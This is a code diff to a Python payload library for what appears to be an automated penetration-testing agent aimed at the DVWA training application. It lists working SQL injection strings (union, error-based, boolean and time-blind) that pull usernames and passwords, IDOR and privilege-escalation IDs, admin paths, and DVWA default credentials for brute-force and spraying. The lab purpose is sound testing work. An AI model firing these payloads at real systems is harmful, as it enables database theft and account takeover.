@@ -22,80 +22,103 @@ class PayloadSet:
     bypass: dict[str, list[str]] = field(default_factory=dict)
 
 
+@dataclass(frozen=True)
+class PayloadSeed:
+    """Validated handwritten payload seed with reproducible provenance."""
+
+    seed_id: str
+    method: str
+    security_level: str
+    stage: str
+    payload_or_logic: str
+    target_param: str
+    expected_signal: str
+    source: str = "static_seed"
+
+
 class PayloadLibrary:
     """Retrieve payloads by vulnerability class and security level."""
 
     _PAYLOAD_DB: dict[str, PayloadSet] = {
         "sqli_union": PayloadSet(
-            probe=["1' UNION SELECT null-- -", "1' UNION SELECT 1,2-- -"],
-            exploit=["1' UNION SELECT user(),database()-- -", "1' UNION SELECT user,password FROM users-- -"],
+            probe=["1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' UNION SELECT null,null-- -"],
+            exploit=["1' UNION SELECT user,password FROM users-- -"],
             bypass={
                 "medium": ["1 UNION SELECT user,password FROM users#"],
                 "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
             },
         ),
         "sqli_error": PayloadSet(
-            probe=["1'", "1''", "1\""],
-            exploit=["1' AND 1=0 UNION SELECT null,version()-- -"],
+            probe=["1'", "1''", "1\\'"],
+            exploit=["1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
+                     "1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users-- -"],
             bypass={
-                "medium": ["1 AND 1=0 UNION SELECT null,version()#"],
-                "high": ["1' AND 1=0 UNION SELECT null,version() LIMIT 1-- -"],
+                "medium": ["1 AND extractvalue(1,concat(0x7e,(SELECT database())))#"],
+                "high": ["1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users LIMIT 1-- -"],
             },
         ),
         "sqli_boolean_blind": PayloadSet(
             probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
-            exploit=["1' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -"],
+            exploit=["1' AND ASCII(SUBSTR(database(),1,1))>77-- -",
+                     "1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77-- -"],
             bypass={
-                "medium": ["1 AND 1=1#", "1 AND 1=2#"],
-                "high": ["1'/**/AND/**/1=1-- -"],
+                "medium": ["1 AND ASCII(SUBSTR(database(),1,1))>77#"],
+                "high": ["1'/**/AND/**/ASCII(SUBSTR(database(),1,1))>77-- -"],
             },
         ),
         "sqli_time_blind": PayloadSet(
-            probe=["1' AND SLEEP(1)-- -", "1' AND pg_sleep(1)-- -"],
-            exploit=["1' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -"],
+            probe=["1' AND SLEEP(3)-- -"],
+            exploit=[
+                "1' AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)-- -",
+                "1' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(3),0)-- -",
+            ],
             bypass={
                 "medium": ["1 AND SLEEP(3)#"],
                 "high": ["1'/**/AND/**/SLEEP(3)-- -"],
             },
         ),
         "ac_idor": PayloadSet(
-            probe=["id=1", "id=2", "id=3"],
-            exploit=["id=4", "id=5", "id=6"],
+            probe=["1", "2", "3"],
+            exploit=["4", "5", "6"],
             bypass={
-                "medium": ["id=7", "id=8", "id=9"],
-                "high": ["id=100", "id=200", "id=300"],
+                "medium": ["7", "8"],
+                "high": ["100", "200"],
             },
         ),
         "ac_vertical_escalation": PayloadSet(
-            probe=["role=user", "role=admin"],
-            exploit=["role=admin&user_id=1", "elevate=1"],
+            probe=["2", "3"],
+            exploit=["1"],
             bypass={
-                "medium": ["role=admin%00user"],
-                "high": ["x-role: admin"],
+                "medium": ["1"],
+                "high": ["1"],
             },
         ),
         "ac_force_browse": PayloadSet(
-            probe=["/admin", "/config", "/backup"],
-            exploit=["/admin/config.php", "/.env"],
+            probe=["setup.php", "phpinfo.php"],
+            exploit=["vulnerabilities/view_source.php", "security.php"],
             bypass={
-                "medium": ["/admin%2fconfig.php"],
-                "high": ["/admin/./config.php"],
+                "medium": ["setup.php"],
+                "high": ["setup.php"],
             },
         ),
+        # NOTE: bf_dictionary, bf_spray, and ac_force_browse have identical
+        # bypass payloads across all security levels because DVWA does not
+        # implement encoding-based bypasses for brute-force or force-browse.
+        # High-level CAPTCHA is a documented scope boundary (AGENTS.md).
         "bf_dictionary": PayloadSet(
-            probe=["admin:password", "admin:admin"],
-            exploit=["gordonb:abc123", "pablo:letmein", "admin:password"],
+            probe=["rate_test:test", "probe:probe"],
+            exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"],
             bypass={
-                "medium": ["admin:password:delay=500ms"],
-                "high": ["admin:password:captcha=bypass"],
+                "medium": ["admin:password"],
+                "high": ["admin:password"],
             },
         ),
         "bf_spray": PayloadSet(
-            probe=["admin:password", "user:password"],
-            exploit=["admin:password", "user:password", "test:test"],
+            probe=["rate_test:test", "probe:probe"],
+            exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "1337:charley"],
             bypass={
-                "medium": ["admin:password:delay=500ms"],
-                "high": ["admin:password:captcha=bypass"],
+                "medium": ["admin:password"],
+                "high": ["admin:password"],
             },
         ),
     }
@@ -127,6 +150,35 @@ class PayloadLibrary:
             exploit=list(payload_set.exploit),
             bypass=bypass_copy,
         )
+
+    def load_seed_candidates(self, method: str, security_level: str = "low") -> list[dict]:
+        """Return static payloads as validator-ready candidate dictionaries."""
+        normalized_level = security_level.lower().strip()
+        if normalized_level not in _SECURITY_LEVELS:
+            normalized_level = "low"
+        payload_set = self.get(method, normalized_level)
+        rows: list[tuple[str, str]] = []
+        rows.extend(("probe", payload) for payload in payload_set.probe)
+        rows.extend(("exploit", payload) for payload in payload_set.exploit)
+        rows.extend(("bypass", payload) for payload in payload_set.bypass.get(normalized_level, []))
+
+        candidates: list[dict] = []
+        for index, (stage, payload) in enumerate(rows):
+            seed_id = f"{method}_{normalized_level}_{stage}_{index}"
+            candidates.append({
+                "candidate_id": seed_id,
+                "source_seed_id": seed_id,
+                "source": "static_seed",
+                "method": method,
+                "security_level": normalized_level,
+                "stage": stage,
+                "mutation_type": "none",
+                "payload_or_logic": payload,
+                "target_param": target_param_for_method(method),
+                "expected_signal": expected_signal_for_method(method),
+                "rationale": "validated handwritten seed",
+            })
+        return candidates
 
     @staticmethod
     def record_tried(state: dict, agent_id: str, payload: str) -> dict:
@@ -176,3 +228,38 @@ class PayloadLibrary:
             blocked_existing = list(state.get("blocked_patterns", []))
             update["blocked_patterns"] = [] if blocked_pattern in blocked_existing else [blocked_pattern]
         return update
+
+
+def target_param_for_method(method: str) -> str:
+    """Handles target param for method behavior for this module.
+
+    Args:
+        method: Value used by this function."""
+    if method.startswith("sqli_"):
+        return "id"
+    if method in {"ac_idor", "ac_vertical_escalation"}:
+        return "userId"
+    if method == "ac_force_browse":
+        return "path"
+    if method.startswith("bf_"):
+        return "credential_pair"
+    return "payload"
+
+
+def expected_signal_for_method(method: str) -> str:
+    """Handles expected signal for method behavior for this module.
+
+    Args:
+        method: Value used by this function."""
+    signals = {
+        "sqli_union": "data_extraction_evidence",
+        "sqli_error": "database_error_leakage",
+        "sqli_boolean_blind": "true_false_response_delta",
+        "sqli_time_blind": "measurable_delay",
+        "ac_idor": "unauthorized_object_access",
+        "ac_vertical_escalation": "privileged_action_accessible",
+        "ac_force_browse": "restricted_endpoint_accessible",
+        "bf_dictionary": "valid_login",
+        "bf_spray": "valid_login",
+    }
+    return signals.get(method, "expected_signal")
